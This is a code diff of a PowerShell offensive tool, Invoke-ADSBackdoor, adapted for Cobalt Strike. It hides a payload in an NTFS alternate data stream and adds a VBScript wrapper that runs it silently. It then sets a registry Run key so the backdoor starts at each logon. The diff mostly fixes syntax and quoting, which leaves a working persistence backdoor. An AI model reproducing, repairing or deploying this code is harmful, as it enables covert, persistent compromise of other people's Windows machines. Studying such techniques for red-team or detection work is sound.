@@ -2,7 +2,8 @@ function Invoke-ADSBackdoor{
 <#
 .SYNOPSIS
 Powershell Script that will use Alternate Data Streams to achieve persistence
-Author: Matt Nelson (@enigma0x3), modified by Jonathan Echavarria (@Und3rf10w) to work with Cobalt Strike
+Author: Matt Nelson (@enigma0x3) 
+Modified by Jonathan Echavarria (@Und3rf10w) to work with Cobalt Strike
 
 .DESCRIPTION
 This script will obtain persistence on a Windows 7+ machine under both Standard and Administrative accounts by 
@@ -20,10 +21,10 @@ PS C:\> Invoke-ADSBackdoor -RegKeyName Und3rf10w_key -backdoored_file_path C:\Wi
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$True)]
-        [string]$cobaltstrike_gen_payload
+        [string]$cobaltstrike_gen_payload,
         
         [Parameter(Mandatory=$False)]
-        [string]$RegKeyName
+        [string]$RegKeyName,
 
         [Parameter(Mandatory=$False)]
         [string]$backdoored_file_path
@@ -45,23 +46,25 @@ PS C:\> Invoke-ADSBackdoor -RegKeyName Und3rf10w_key -backdoored_file_path C:\Wi
 
     $vbstext1 = "Dim objShell"
     $vbstext2 = "Set objShell = WScript.CreateObject(""WScript.Shell"")"
-    $vbstext3 = "command = ""cmd /C for /f """"delims=,"""" %i in ($backdoored_file_path" + ":" + "$payload_adsfile_name") do %i""" #TODO: change the path to a proper variable
+    $vbstext3 = "command = ""cmd /C for /f """"delims=,"""" %i in ($backdoored_file_path" + ":" + "$payload_adsfile_name) do %i""" #TODO: change the path to a proper variable
     $vbstext4 = "objShell.Run command, 0"
     $vbstext5 = "Set objShell = Nothing"
     $vbText = $vbstext1 + ":" + $vbstext2 + ":" + $vbstext3 + ":" + $vbstext4 + ":" + $vbstext5
 
-    $createPayloadADS = {cmd /C "echo $payload > $backdoored_file_path:$payload_adsfile_name"}
-    Write-Host "Payload stored in $backdoored_file_path" + ":$payload_adsfile_name"
-    $createWrapperADS = {cmd /C "echo $vbtext > $backdoored_file_path:$wrapper_adsfile_name"}
-    Write-Host "Payload VBS wrapper stored in $backdoored_file_path" + ":$wrapper_adsfile_name"
+    $backADSFile = "$backdoored_file_path" + ":$payload_adsfile_name"
+    $wrapADSFile = "$backdoored_file_path" + ":$wrapper_adsfile_name"
+
+    $createPayloadADS = {cmd /C "echo $payload > $backADSFile"}
+    $createWrapperADS = {cmd /C "echo $vbtext > $wrapADSFile"}
 
     Invoke-Command -ScriptBlock $createPayloadADS
     Invoke-Command -ScriptBlock $createWrapperADS
-
-    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegKeyName -PropertyType String -Value "\"wscript.exe " + "$backdoored_file_path" + ":$wrapper_adsfile_name\"" -Force
-
-    Write-Host "Backdoor Deployed, details provided below, take notes:"
+    
+    $backCommand = "`"wscript.exe " + "$backdoored_file_path" + ":$wrapper_adsfile_name`""
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegKeyName -PropertyType String -Value $backCommand -Force
+    
+    Write-Host "Backdoor Deployed, details provided below; take notes:"
     Write-Host "Reg key path: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$RegKeyName"
-    Write-Host "Payload path: $backdoored_file_path" + ":$payload_adsfile_name"
-    Write-Host "Wrapper path: $backdoored_file_path" + ":$wrapper_adsfile_name"
+    Write-Host "Payload path: $backADSFile"
+    Write-Host "Wrapper path: $wrapADSFile"
 }
